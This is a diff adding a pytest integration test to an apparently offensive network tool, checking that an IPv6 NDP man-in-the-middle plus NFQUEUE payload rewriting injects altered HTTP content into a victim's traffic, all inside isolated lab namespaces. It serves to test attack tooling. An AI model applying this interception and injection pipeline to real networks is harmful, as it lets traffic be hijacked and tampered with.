@@ -371,3 +371,92 @@ def test_interactive_intercept_edit_is_delivered():
                 mitm.stop()
             if server is not None:
                 server.terminate(); server.wait(timeout=3)
+
+
+def _router_mac_in_victim6(router_ip6: str) -> str | None:
+    from reforge.testlab.netlab import neigh_table
+    for line in neigh_table("rf-victim", "-6").splitlines():
+        parts = line.split()
+        if parts and parts[0] == router_ip6 and "lladdr" in parts:
+            return parts[parts.index("lladdr") + 1].lower()
+    return None
+
+
+def test_ipv6_ndp_mitm_content_injection_reaches_victim():
+    """IPv6 parity for the inline path: NDP-MITM the victim, and the NFQUEUE
+    rewrites their forwarded IPv6 HTTP traffic (the ip6 nft matcher fix)."""
+    import tempfile
+
+    pytest.importorskip("netfilterqueue")
+
+    from reforge.attacks.ndp_mitm import NdpMitm
+    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
+    from reforge.rules.actions import PayloadReplace
+    from reforge.rules.base import Rule
+    from reforge.rules.engine import RuleEngine
+    from reforge.rules.filter import parse_filter
+
+    qnum = 36
+    docroot = tempfile.mkdtemp(prefix="rf-doc6-")
+    with open(os.path.join(docroot, "p.html"), "w") as fh:
+        fh.write("V6BANNER=ORIGINAL-TKN\n")     # same length as the replacement
+
+    server = mitm = runner = rt = None
+    remove = []
+    with SegmentLab() as net:
+        try:
+            server = subprocess.Popen(
+                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
+                 "8000", "--bind", net["gateway_ip6"]],
+                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1.0)
+
+            atk_mac = _attacker_mac()
+            mitm = NdpMitm(ATTACKER_IFACE, [net["victim_ip6"]],
+                           router=net["gateway_ip6"], interval=1.0)
+            assert mitm.start(), f"NDP MITM did not start: {mitm.warnings}"
+            assert mitm.status()["forwarding_on"], "need IPv6 forwarding to relay"
+
+            netns_exec("rf-victim", "ping", "-6", "-c", "1", "-W", "1", net["gateway_ip6"],
+                       check=False)
+            flipped = False
+            for _ in range(20):
+                if _router_mac_in_victim6(net["gateway_ip6"]) == atk_mac:
+                    flipped = True
+                    break
+                time.sleep(0.4)
+            assert flipped, "victim never routed IPv6 through the attacker"
+
+            install, remove = nft_forward_queue_rules(qnum, victims=[net["victim_ip6"]])
+            for cmd in install:
+                r = subprocess.run(cmd, capture_output=True, text=True, check=False)
+                assert r.returncode == 0, f"nft rule failed: {' '.join(cmd)} -> {r.stderr}"
+            engine = RuleEngine([Rule("inject",
+                                      parse_filter('Raw.load contains "ORIGINAL-TKN"'),
+                                      [PayloadReplace(b"ORIGINAL-TKN", b"INJECTED-TKN")])])
+            runner = NfqueueRunner(engine, queue_num=qnum)
+            rt = threading.Thread(target=runner.run, daemon=True)
+            rt.start()
+            time.sleep(0.6)
+
+            got = ""
+            for _ in range(4):
+                r = netns_exec("rf-victim", "curl", "-s", "-g", "-m", "5",
+                               f"http://[{net['gateway_ip6']}]:8000/p.html", check=False)
+                got = r.stdout
+                if "INJECTED-TKN" in got:
+                    break
+                time.sleep(0.3)
+            assert "INJECTED-TKN" in got, f"IPv6 victim did not get injected content: {got!r}"
+            assert runner.stats.modified >= 1
+        finally:
+            if runner is not None:
+                runner.stop()
+            if rt is not None:
+                rt.join(timeout=2.0)
+            for cmd in remove:
+                subprocess.run(cmd, check=False, capture_output=True)
+            if mitm is not None:
+                mitm.stop()
+            if server is not None:
+                server.terminate(); server.wait(timeout=3)
